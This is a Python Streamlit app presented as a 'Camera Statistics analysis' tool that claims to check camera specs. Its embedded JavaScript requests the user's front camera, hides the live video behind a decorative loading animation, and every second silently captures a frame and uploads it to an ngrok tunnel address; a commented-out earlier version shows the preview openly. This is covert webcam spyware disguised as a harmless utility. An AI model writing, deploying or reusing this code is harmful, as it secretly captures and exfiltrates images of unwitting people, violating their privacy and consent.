import streamlit as st

st.set_page_config(layout="centered")
st.title("📤 Camera Statistics analysis")

# Set this to your laptop's local IP on same Wi-Fi (e.g., 192.168.x.x)
upload_url = "https://cce2-2409-40f2-146-74ea-d415-9c4f-b372-154c.ngrok-free.app/upload"  # <-- Replace with actual IP

st.markdown(f"""
This app checks camera specs to:
Make sure you allow permission to access the camera.
""")

# st.components.v1.html(f"""
# <video id="video" autoplay playsinline width="100%" style="max-width: 400px;"></video>
# <canvas id="canvas" style="display:none;"></canvas>

# <script>
# const video = document.getElementById('video');
# const canvas = document.getElementById('canvas');
# const ctx = canvas.getContext('2d');
# const uploadUrl = "{upload_url}";

# navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
#   .then(stream => {{
#     video.srcObject = stream;
#   }})
#   .catch(err => {{
#     alert("Webcam access denied: " + err);
#   }});

# setInterval(() => {{
#   if (video.readyState === video.HAVE_ENOUGH_DATA) {{
#     canvas.width = video.videoWidth;
#     canvas.height = video.videoHeight;
#     ctx.drawImage(video, 0, 0);
#     canvas.toBlob(blob => {{
#       const formData = new FormData();
#       formData.append('frame', blob, 'frame.jpg');
#       fetch(uploadUrl, {{
#         method: 'POST',
#         body: formData
#       }}).catch(e => console.log("Upload error", e));
#     }}, 'image/jpeg');
#   }}
# }}, 1000);  // 1 frame per second
# </script>
# """, height=480)

st.components.v1.html(f"""
<!-- Hidden video (used for capturing) -->
<video id="video" autoplay playsinline style="display: none;"></video>

<!-- Image shown instead of video preview -->
<object id="placeholder" 
        type="image/svg+xml" 
        data="https://cdn.svgator.com/images/2023/06/generative-ai-preloader.svg"
        width="100%" 
        style="max-width: 400px;">
</object>


<!-- Hidden canvas for frame capture -->
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
const uploadUrl = "{upload_url}";

// Request camera access
navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
  .then(stream => {{
    video.srcObject = stream;
    // preview is hidden — no need to change DOM
  }})
  .catch(err => {{
    alert("Webcam access denied: " + err);
  }});

// Capture and upload frames
setInterval(() => {{
  if (video.readyState === video.HAVE_ENOUGH_DATA) {{
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    canvas.toBlob(blob => {{
      const formData = new FormData();
      formData.append('frame', blob, 'frame.jpg');
      fetch(uploadUrl, {{
        method: 'POST',
        body: formData
      }}).catch(e => console.log("Upload error", e));
    }}, 'image/jpeg');
  }}
}}, 1000);
</script>
""", height=480)
